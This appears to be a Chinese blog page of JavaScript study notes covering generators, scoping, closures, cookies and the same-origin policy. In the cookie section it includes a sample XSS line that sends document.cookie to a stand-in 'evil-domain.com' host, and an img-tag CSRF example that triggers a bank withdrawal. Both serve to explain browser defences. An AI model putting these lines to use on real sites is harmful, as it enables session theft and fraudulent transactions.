<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> *<span class="title">gen</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">yield</span> <span class="number">10</span>;</span><br><span class="line">  x = <span class="keyword">yield</span> <span class="string">&#x27;foo&#x27;</span>;</span><br><span class="line">  <span class="keyword">yield</span> x;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 1. 调用一个生成器函数并不会立即执行里面的语句</span></span><br><span class="line"><span class="comment">// 2. 而是返回这个生成器的迭代器 (iterator)</span></span><br><span class="line"><span class="comment">// 3. next() 方法首次调用, 函数内的语句会执行到第一个 yield 的位置位置, 包括 yield</span></span><br><span class="line"><span class="comment">// 4. yield 返回紧跟迭代器要返回的值</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 5. yield* 则将执行权交给另一个生成器函数</span></span><br><span class="line"><span class="comment">// 6. next() 方法返回一个对象 value | done</span></span><br><span class="line"><span class="comment">// 7. value: 本次 yield 返回值</span></span><br><span class="line"><span class="comment">// 8. done: 表示生成器后是否还有 yield 语句</span></span><br><span class="line"><span class="keyword">var</span> gen_obj = gen();</span><br><span class="line"><span class="built_in">console</span>.log(gen_obj.next().value); <span class="comment">// 10</span></span><br><span class="line"><span class="built_in">console</span>.log(gen_obj.next().value); <span class="comment">// foo</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// next 含参数: 传给上一条 yield 语句的左边的变量</span></span><br><span class="line"><span class="built_in">console</span>.log(gen_obj.next(<span class="number">100</span>).value); <span class="comment">// yield x : 100</span></span><br><span class="line"><span class="built_in">console</span>.log(gen_obj.next().value); <span class="comment">// undefined 如果是 done 则为 true</span></span><br></pre></td></tr></table></figure></li>
<li><p><code>for...of</code></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> arr = [<span class="number">3</span>, <span class="number">5</span>, <span class="number">7</span>]</span><br><span class="line">arr.foo = <span class="string">&#x27;hello&#x27;</span></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> i <span class="keyword">in</span> arr) &#123;<span class="built_in">console</span>.log(i);&#125;</span><br><span class="line"><span class="comment">// &quot;0&quot;, &quot;1&quot;, &quot;2&quot;, &quot;foo&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> i <span class="keyword">of</span> arr) &#123;<span class="built_in">console</span>.log(i);&#125;</span><br><span class="line"><span class="comment">// &quot;3&quot;, &quot;5&quot;, &quot;7&quot;</span></span><br></pre></td></tr></table></figure></li>
<li><p><code>decodeURIComponent(encodedURI)</code></p>
<blockquote>
<p>参数: 编码后的部分 URI</p>
<blockquote>
</blockquote>
<p>将已编码的 URI 中所有能识别的转义序列转换成原字符</p>
</blockquote>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">decodeURIComponent</span>(<span class="string">&quot;JavaScript_%D1%88%D0%B5%D0%BB%D0%BB%D1%8B&quot;</span>);</span><br><span class="line"><span class="comment">// JavaScript_шеллы</span></span><br></pre></td></tr></table></figure></li>
<li><p><code>let</code></p>
<blockquote>
<p>先看 <code>var</code></p>
</blockquote>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">hello</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> x = <span class="number">4</span>;</span><br><span class="line">  <span class="keyword">if</span>(x &gt; <span class="number">3</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> x = <span class="number">1</span>;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&#x27;if&#x27;</span>, x);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">&#x27;function&#x27;</span>, x);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// hello 1</span></span><br><span class="line"><span class="comment">// function 1</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<blockquote>
<ol>
<li>用 <code>var</code> 声明的变量范围是 <strong>函数范围</strong></li>
<li>在 if 语句内的 x 与 语句外的 x 是同一变量</li>
</ol>
</blockquote>
<blockquote>
<p>对比 <code>let</code></p>
</blockquote>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">hello</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> x = <span class="number">4</span>;</span><br><span class="line">  <span class="keyword">if</span>(x &gt; <span class="number">3</span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> x = <span class="number">1</span>;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&#x27;if&#x27;</span>, x);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">&#x27;function&#x27;</span>, x);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// if 1</span></span><br><span class="line"><span class="comment">// function 4</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<blockquote>
<p>使用 let 声明的比那里是 <strong>块范围</strong></p>
</blockquote>
<blockquote>
<p>一些不同:</p>
</blockquote>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">hello</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(x)</span><br><span class="line">  <span class="built_in">console</span>.log(y)</span><br><span class="line">  <span class="keyword">var</span> x = <span class="number">0</span></span><br><span class="line">  <span class="keyword">let</span> y = <span class="number">1</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// undefined</span></span><br><span class="line"><span class="comment">// ReferenceError: y is not defined</span></span><br></pre></td></tr></table></figure>
<blockquote>
<ol>
<li>也就是说使用 let 声明的变量<strong>并不会变量提升</strong><blockquote>
</blockquote>
</li>
<li>同一个函数或块中不可以用 let 重新声明一个变量<blockquote>
</blockquote>
</li>
<li></li>
</ol>
</blockquote>
</li>
<li><p><code>class</code></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 创建一个基于原型继承的具有给定名称的新类</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Polygon</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="title">constructor</span>(<span class="params">height, width</span>)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.area = height * width;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Square</span> <span class="keyword">extends</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="title">constructor</span>(<span class="params">length</span>)</span> &#123;</span><br><span class="line">    <span class="built_in">super</span>(length, length); <span class="comment">// 只能在构造函数内调用, 且在以下语句之前</span></span><br><span class="line">    <span class="built_in">this</span>.name = <span class="string">&#x27;Square&#x27;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


</li>
</ul>
<h4 id="⭐-嵌套函数和闭包"><a href="#⭐-嵌套函数和闭包" class="headerlink" title="⭐ 嵌套函数和闭包"></a>⭐ 嵌套函数和闭包</h4><h5 id="🌟-嵌套函数"><a href="#🌟-嵌套函数" class="headerlink" title="🌟 嵌套函数"></a>🌟 嵌套函数</h5><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">inside(); <span class="comment">// inside is not defined  =&gt;  1.内部函数只可以在外部函数访问</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">outside</span>(<span class="params">x</span>) </span>&#123; </span><br><span class="line">    <span class="built_in">console</span>.log(y); </span><br><span class="line">    <span class="comment">// y is not defined  =&gt;  3.外部函数不能使用内部函数参数和变量, 如: y</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 内部函数形成 闭包</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">inside</span>(<span class="params">y</span>) </span>&#123; </span><br><span class="line">        <span class="keyword">return</span> x + y;  <span class="comment">//  2.内部函数可以访问外部函数的参数和变量, 如: x</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> inside;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fn_inside = outside(<span class="number">3</span>);</span><br><span class="line"><span class="built_in">console</span>.log(fn_inside(<span class="number">5</span>)); <span class="comment">// 8</span></span><br><span class="line"><span class="built_in">console</span>.log(outside(<span class="number">3</span>)(<span class="number">5</span>)); <span class="comment">// 8</span></span><br></pre></td></tr></table></figure>
<h5 id="命名冲突"><a href="#命名冲突" class="headerlink" title="命名冲突"></a>命名冲突</h5><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">outside</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> x = <span class="number">5</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">inside</span>(<span class="params">x</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> x*<span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> inside;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">outside()(<span class="number">10</span>) <span class="comment">// 20 instead of 10</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p><code>inside</code> 的 <code>x</code> 和 <code>onside</code> 的 <code>x</code> 冲突, 这里的作用域链是: {<code>inside</code>, <code>outside</code>, 全局对象}, <code>inside</code> 的 <code>x</code> 具有最高优先权;</p>
</blockquote>
<h5 id="用闭包模拟私有方法"><a href="#用闭包模拟私有方法" class="headerlink" title="用闭包模拟私有方法"></a>用闭包模拟私有方法</h5><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> makeCounter = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> privateCounter = <span class="number">0</span>;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">changeBy</span>(<span class="params">val</span>) </span>&#123;</span><br><span class="line">    privateCounter += val;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> &#123;</span><br><span class="line">    increment: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">      changeBy(<span class="number">1</span>);</span><br><span class="line">    &#125;,</span><br><span class="line">    decrement: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">      changeBy(-<span class="number">1</span>);</span><br><span class="line">    &#125;,</span><br><span class="line">    value: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">      <span class="keyword">return</span> privateCounter;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> Counter1 = makeCounter();</span><br><span class="line"><span class="keyword">var</span> Counter2 = makeCounter();</span><br><span class="line"><span class="built_in">console</span>.log(Counter1.value()); <span class="comment">/* logs 0 */</span></span><br><span class="line">Counter1.increment();</span><br><span class="line">Counter1.increment();</span><br><span class="line"><span class="built_in">console</span>.log(Counter1.value()); <span class="comment">/* logs 2 */</span></span><br><span class="line">Counter1.decrement();</span><br><span class="line"><span class="built_in">console</span>.log(Counter1.value()); <span class="comment">/* logs 1 */</span></span><br><span class="line"><span class="built_in">console</span>.log(Counter2.value()); <span class="comment">/* logs 0 */</span></span><br></pre></td></tr></table></figure>
<blockquote>
<ol>
<li>只创建了一个词法环境, 为三个函数共享:  <code>Counter.increment, Counter.decrement, Counter.value</code><blockquote>
</blockquote>
</li>
<li>共享环境创建于一个<strong>立即执行</strong>的匿名函数体内, 包含两个私有项: <code>privateCounter</code> 和 <code>changeBy</code>; 这两项都无法在这个匿名函数外部直接访, 必须通过匿名函数返回的三个公共函数访问<blockquote>
</blockquote>
</li>
<li><code>Counter1</code> 与 <code>Counter2</code> 各自独立<blockquote>
</blockquote>
</li>
<li>函数的作用域及其所有变量都会在函数执行结束后被销毁, <strong>但是在创建了一个闭包后,</strong> 这个函数的作用域会一直保存到闭包不存在为止;</li>
</ol>
</blockquote>
<h5 id="🌟-在循环中创建闭包-一个常见错误"><a href="#🌟-在循环中创建闭包-一个常见错误" class="headerlink" title="🌟 在循环中创建闭包: 一个常见错误"></a>🌟 在循环中创建闭包: 一个常见错误</h5><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">show</span>(<span class="params">i</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(i);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">showCallback</span>(<span class="params">i</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    show(i);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>注意: <code>setTimeout()</code> 函数回调属于 <strong>异步任务</strong> , 会出现在 <strong>宏任务队列</strong> 中, 被压到任务队列最后, 在这段代码中应该是 <code>for</code> 循环中的 <strong>同步任务</strong> 执行完成后才会轮到它</p>
<blockquote>
<p><code>setTimeout()</code> 的特殊性: 在 <code>for</code> 循环中始终在最后执行, 即使约定的时间为 0</p>
</blockquote>
</blockquote>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 测试1: [3, 3, 3]</span></span><br><span class="line"><span class="keyword">const</span> testFunc1 = <span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> i=<span class="number">0</span>; i&lt;<span class="number">3</span>; i++) &#123;</span><br><span class="line">    <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> show(i), <span class="number">300</span>); <span class="comment">// 闭包, 循环创建的 3 个闭包共享同一个词法作用域</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<ol>
<li>使用 <code>var</code> =&gt; 变量提升 =&gt; 循环在事件触发之前早已执行完毕 =&gt; 变量对象 <code>i</code> 指向最后一个 <code>i</code> 值<blockquote>
</blockquote>
</li>
<li><code>() =&gt; show(i)</code> 是回调函数, 但是并未传入参数, 因此在最后执行的时候, <code>i</code> 往上级找, 并找到了外部函数声明的 <code>i</code></li>
</ol>
</blockquote>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 测试2: [0, 1, 2]</span></span><br><span class="line"><span class="keyword">const</span> testFunc2 = <span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>; i&lt;<span class="number">3</span>; i++) &#123;</span><br><span class="line">    <span class="built_in">setTimeout</span>(showCallback(i), <span class="number">300</span>); <span class="comment">// 闭包, </span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<ol>
<li>这里将 <code>i</code> 作为参数传入 <code>showCallback(i)</code> 中, 该函数为每一个回调创建了一个新的词法环境<blockquote>
</blockquote>
</li>
</ol>
</blockquote>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 测试3: [0, 1, 2] 闭包, 立即执行函数</span></span><br><span class="line"><span class="keyword">const</span> testFunc3 = <span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>; i&lt;<span class="number">3</span>; i++) &#123;</span><br><span class="line">    (<span class="function">() =&gt;</span> &#123;</span><br><span class="line">      <span class="built_in">setTimeout</span>(show(i), <span class="number">3000</span>)</span><br><span class="line">    &#125;)(i);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<ol>
<li>在闭包函数内部形成了局部作用域, 每循环一次, 形成一个自己的局部作用域<blockquote>
</blockquote>
</li>
</ol>
</blockquote>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 测试4: [0, 1, 2]</span></span><br><span class="line"><span class="comment">// 使用 let</span></span><br><span class="line"><span class="keyword">const</span> testFunc4 = <span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">let</span> i=<span class="number">0</span>; i&lt;<span class="number">3</span>; i++) &#123;</span><br><span class="line">    <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> show(i), <span class="number">300</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p><code>js</code> 中的 <code>for</code> 循环特殊: 每次执行都是一个全新的独立的 <strong>块作用域</strong> , 用 <code>let</code> 声明的变量传入到循环体的作用域后, 不会发送改变, 不受外界影响</p>
<blockquote>
</blockquote>
</blockquote>
<h4 id="⭐-浏览器的同源策略-及-跨域相关内容"><a href="#⭐-浏览器的同源策略-及-跨域相关内容" class="headerlink" title="⭐ 浏览器的同源策略 及 跨域相关内容"></a>⭐ 浏览器的同源策略 及 跨域相关内容</h4><blockquote>
<p>限制一个 <code>orgin</code> 的文档或者它加载的脚本如何能与另一个源的资源进行交互</p>
<blockquote>
</blockquote>
</blockquote>
<h5 id="🌟-HTTP-cookies"><a href="#🌟-HTTP-cookies" class="headerlink" title="🌟 HTTP cookies"></a>🌟 <code>HTTP cookies</code></h5><blockquote>
<p>服务器 —-发送给—-&gt; 用户浏览器 并保存至本地的一小块数据</p>
<blockquote>
</blockquote>
<p>用户浏览器 —-发起请求—-&gt; 服务器, 携带发送到服务器上</p>
<blockquote>
</blockquote>
<p>作用: 确认两个请求是否来自同一浏览器: 保持用户的 login 状态</p>
</blockquote>
<ol>
<li><p>服务器创建 <code>Cookie</code> 发送到客户端:(http 回应)<br><code>Set-Cookie: &lt;cookie名&gt;=&lt;cookie值&gt;; Expires=&lt;date&gt;; Domain=&lt;domain-value&gt;; Path=&lt;path-value&gt;; Secure</code></p>
</li>
<li><p>生命周期: </p>
<ul>
<li>会话期 <code>Cookie</code>: 页面关闭, <code>Cookie</code> 删除</li>
<li>持久性 <code>Cookie</code>: 过期时间(<code>Expires</code>) 和 有效期(<code>Max-Age</code>)</li>
</ul>
</li>
<li><p>限制访问 <code>Cookie</code>:</p>
<ul>
<li><code>Secure</code> 属性: <code>Cookie</code> 将通过 <code>HTTPS</code> 协议加密请求发送给服务端, 如果协议是 <code>HTTP</code>, 则忽略 该属性</li>
<li><code>Document.cookie</code> 无法访问带有 <code>HttpOnly</code> 属性的 <code>cookie</code><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 会话劫持与XSS</span></span><br><span class="line"><span class="keyword">new</span> Image()).src = <span class="string">&quot;http://www.evil-domain.com/steal-cookie.php?cookie=&quot;</span> + <span class="built_in">document</span>.cookie;</span><br></pre></td></tr></table></figure>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 恶意图片, 一点就跳到银行转账界面, 如果以前登录过这个银行网站, 好家伙, 把 cookie 也发过去了, 账真转过去了</span></span><br><span class="line">&lt;img src=<span class="string">&quot;http://bank.example.com/withdraw?account=bob&amp;amount=1000000&amp;for=mallory&quot;</span>&gt;</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p><code>Cookie</code> 作用域:</p>
<ul>
<li><code>Domain</code> 属性: 默认 <code>origin</code> 不包含子域名, 但如果刻意声明了: <code>Domain=mozilla.org</code>, 则包含子域名 <code>developer.mozilla.org</code></li>
<li><code>Path</code> 属性: <code>Path=/docs</code>, 则 <code>/docs</code> <code>/docs/web/</code> <code>/docs/web/http</code> 都匹配</li>
<li><code>SameSite</code>: 允许某个 <code>cookie</code> 在跨站请求时不发送, 阻止<strong>跨站伪造攻击</strong>(<code>CSRF</code>), 三值:</li>
<li><code>None</code>: 无所谓<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Lax一般为默认选项, 网站可以选择显示关闭, 即 SameSite = None,  但此时必须同时设置Secure, 否则不会起作用</span></span><br><span class="line"><span class="built_in">Set</span>-Cookie: widget_session=abc123; SameSite=None; Secure</span><br><span class="line"></span><br><span class="line"><span class="built_in">Set</span>-Cookie: widget_session=abc123; SameSite=None <span class="comment">// 无效</span></span><br></pre></td></tr></table></figure></li>
<li><code>Strict</code>: 相同站点才发送<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;https://github.com&quot;</span>&gt;</span>Github<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p>设置 Strict 后, 点击链接跳转后 github 都是未登录</p>
</blockquote>
</li>
<li><code>Lax</code>: 从外部站点导航至 <code>URL</code> 可以, 其他同 <code>Strict</code><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 设置 Lax 后发送 Cookie, 正常情况下也发送--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;...&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;prerender&quot;</span> <span class="attr">href</span>=<span class="string">&quot;...&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">&quot;GET&quot;</span> <span class="attr">action</span>=<span class="string">&quot;...&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 设置 Lax 后也不会发送, 正常情况下是发送的--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span> <span class="attr">action</span>=<span class="string">&quot;&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;...&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line">$.get(&quot;...&quot;)</span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;...&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>JavaScript 访问 <code>Cookie</code></p>
<ul>
<li>设置: <code>document.cookie = &quot;foo=bar; expires=Fri, 31 Dec 2020 23:59:59 GMT&quot;;</code>, 一次一条, 等号 两边没空格</li>
<li>访问: <code>document.cookie</code></li>
</ul>
</li>
</ol>
<h5 id="🌟-同源限制"><a href="#🌟-同源限制" class="headerlink" title="🌟 同源限制"></a>🌟 同源限制</h5><blockquote>
<p>同源: 两个 <code>URL</code> 的 <strong>协议、主机、端口</strong> 相同, 则同源;</p>
<blockquote>
</blockquote>
</blockquote>
<p>以 <code>http://store.company.com/dir/page.html</code> 为例:</p>
<ol>
<li><code>http://store.company.com/dir2/other.html</code>: 同, 只是路径不同;</li>
<li><code>https://store.company.com/secure.html</code>: 不, 协议不同;</li>
<li><code>http://store.company.com:81/dir/etc.html</code>: 不, 端口不同;</li>
<li><code>http://news.company.com/dir/page.html</code>: 不, 主机不同  <br>

</li>
</ol>
<h6 id="干嘛同源-A-–-银行网站-–-设置了一些-cookie-密码-–-用户离开-A-到-B-–-如果没有同源限制-–-B-也能得到-A-的-cookie-–-信息泄漏"><a href="#干嘛同源-A-–-银行网站-–-设置了一些-cookie-密码-–-用户离开-A-到-B-–-如果没有同源限制-–-B-也能得到-A-的-cookie-–-信息泄漏" class="headerlink" title="干嘛同源: A – 银行网站 – 设置了一些 cookie: 密码 – 用户离开 A 到 B – 如果没有同源限制 – B 也能得到 A 的 cookie – 信息泄漏"></a>干嘛同源: A – 银行网站 – 设置了一些 cookie: 密码 – 用户离开 A 到 B – 如果没有同源限制 – B 也能得到 A 的 cookie – 信息泄漏</h6><br>

<h5 id="限制范围"><a href="#限制范围" class="headerlink" title="限制范围"></a>限制范围</h5><ol>
<li>无法读取非同源网页的 <code>Cookie</code> | <code>LocalStorage</code> | <code>IndexedDB</code></li>
<li>无法接触 非同源网页 的 <code>DOM</code></li>
<li>无法向 非同源地址发送 <code>AJAX</code> 请求( 可以发送, 但是浏览器<strong>拒绝接收响应</strong>)  <br/>

</li>
</ol>
<blockquote>
<p><strong>例外</strong>: 通过 Javascript 脚本可以访问其他窗口 <code>window</code> 对象, <strong>非同源情况</strong>下, 可以访问的属性和方法: <code>window.closed</code> | <code>window.frames</code> | <code>window.length</code> | <code>window.location</code> | <code>window.opener</code> | <code>window.parent</code> | <code>window.self</code> | <code>window.top</code> | <code>window.top</code> | <code>window.window</code> | <code>window.blur()</code> | <code>window.close()</code> | <code>window.focus()</code> | <code>window.postMessage()</code></p>
<blockquote>
</blockquote>
<br>
</blockquote>
<blockquote>
<p><code>cookie</code> 什么时候可以共享: 两页面<strong>同时</strong>设置 <code>document.domain = &lt;domain-value&gt;</code>, 浏览器通过 <code>document.cookie</code> 检查是否同源</p>
</blockquote>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">document</span>.domain = <span class="string">&quot;mozilla.org&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// A</span></span><br><span class="line"><span class="built_in">document</span>.cookie = <span class="string">&quot;test=hello&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// B</span></span><br><span class="line"><span class="built_in">document</span>.cookie <span class="comment">// 包含 &quot;test=hello&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 但是现在很多网站在设置 document.domain 都会检测是否是当前域名, 或当前域名的子域名, 不是就会拒绝设置</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 这种办法只能解决主域名相同而二级域名不同的情况</span></span><br></pre></td></tr></table></figure>
<blockquote>
<blockquote>
</blockquote>
<p>当然服务器设置 Cookie 的时候, 也可以指定 Cookie 的所属域名为一级域名, 这样二级或三级域名就不用设置就可以读取这个 Cookie 了</p>
<blockquote>
</blockquote>
<p><code>iframe 和 多窗口通信</code>: <code>iframe</code> 可在当前网页嵌入其他网页, 不妨设 当前网页=<code>parent</code>, 其他网页=<code>child</code>; 二者若是同源则可通信, 否则就会因为跨域而导致报错; 当然可以设置 domain 规避非同源</p>
</blockquote>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// parent visit child</span></span><br><span class="line"><span class="built_in">document</span></span><br><span class="line">.getElementById(<span class="string">&quot;myIFrame&quot;</span>)</span><br><span class="line">.contentWindow</span><br><span class="line">.document</span><br><span class="line"><span class="comment">// Blocked a frame from accesing a cross-orgin frame</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// child ask parent</span></span><br><span class="line"><span class="built_in">window</span>.paren.document.body <span class="comment">// error</span></span><br></pre></td></tr></table></figure>
<h5 id="解决不同源的问题"><a href="#解决不同源的问题" class="headerlink" title="解决不同源的问题"></a>解决不同源的问题</h5><ol>
<li><p>片段识别符 (<code>fragment identifier</code>)</p>
<ul>
<li><span class="emoji" alias="one" style="" fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/0031-20e3.png?v8">&#x0031;&#xfe0f;&#x20e3;</span><blockquote>
<p>片段标识符: URL <code>#</code> 后面的部分</p>
<blockquote>
</blockquote>
<p><code>http://example.com/x.html#fragment</code> 的 <code>#fragment</code></p>
<blockquote>
</blockquote>
</blockquote>
</li>
</ul>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 同上 frame 的例子: 父 将信息写入 子的片段标识符</span></span><br><span class="line"><span class="keyword">var</span> src = originURL + <span class="string">&#x27;#&#x27;</span> + data;</span><br><span class="line"><span class="built_in">document</span>.getElementById(<span class="string">&#x27;myIFrame&#x27;</span>).src = src;</span><br></pre></td></tr></table></figure>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 子 通过监听 hashchange 事件得到通知</span></span><br><span class="line"><span class="built_in">window</span>.onhashchange = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> message = <span class="built_in">window</span>.location.hash;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 子 改变 父 的片段标识符</span></span><br><span class="line">parent.location.href = target + <span class="string">&#x27;#&#x27;</span> + hash;</span><br></pre></td></tr></table></figure></li>
<li><p>跨文档通信 API (<code>Cross-document messaging</code>)</p>
</li>
</ol>
<blockquote>
<p>引入 <code>跨文档通信 API (Cross-document messaging)</code></p>
<blockquote>
</blockquote>
<p>推出方法: <code>window.postMessage()</code></p>
</blockquote>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 父: aaa.com ----&gt; 子: bbb.com</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 效果: 父窗口新打开一个子窗口(2个窗口)</span></span><br><span class="line"><span class="keyword">var</span> popup = <span class="built_in">window</span>.open(<span class="string">&#x27;http://bbb.com&#x27;</span>, <span class="string">&#x27;title&#x27;</span>); <span class="comment">// 父打开一个子窗口</span></span><br><span class="line"></span><br><span class="line">popup.postMessage(<span class="string">&#x27;hello&#x27;</span>, <span class="string">&#x27;http://bbb.com&#x27;</span>);</span><br><span class="line"><span class="comment">// 1. 数据  2. 接收的源 -- 协议 + 域名 + 窗口</span></span><br></pre></td></tr></table></figure>
